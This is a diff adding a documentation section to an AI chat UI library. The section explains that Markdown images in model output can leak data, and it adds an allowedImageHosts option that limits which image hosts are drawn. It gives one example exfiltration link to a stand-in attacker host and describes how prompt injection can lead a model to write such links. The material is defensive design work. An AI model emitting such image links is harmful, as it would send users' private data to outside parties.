@@ -767,6 +767,27 @@ The bundled chat UI components (`ai-chat.js` and `chat-interaction.js`) support 
 
 When an image-capable deployment is configured (e.g., a DALL-E model), the `GenerateImageTool` produces image URLs that the chat UI renders inline. No additional client-side libraries are required — generated images are displayed automatically using standard `<img>` tags.
 
+### Which images the chat draws
+
+A Markdown image in an answer makes the browser fetch its address on its own, and text the model was tricked into
+writing, or read out of a document, can put what it knows in that address
+(`![](https://attacker.example/pixel?data=...)`). So the chat only draws an image that comes from the page's own
+origin, from a host in `allowedImageHosts`, or that is a `data:` or same-origin `blob:` image, which makes no request.
+Any other image is shown as a plain link the visitor must choose to follow. Raw `<img>` tags in an answer follow the same
+rule.
+
+`allowedImageHosts` is a chat config option of both `ai-chat.js` and `chat-interaction.js`: an array of host names,
+where `images.example.com` matches that host and `*.example.com` matches its subdomains (not the bare domain). It is
+empty by default, which means same-origin only. Figures served by this host (`/ai/documents/{id}/figures/{figureId}`)
+are same-origin and need no entry.
+
+```js
+window.coreAIChatManager().initialize({
+    // ...
+    allowedImageHosts: ['images.example.com', '*.cdn.example.com']
+});
+```
+
 ### Interactive Charts
 
 The `GenerateChartTool` returns [Chart.js](https://www.chartjs.org/) configuration objects that the chat UI can render as interactive charts. To enable chart rendering, include the Chart.js library on your page:
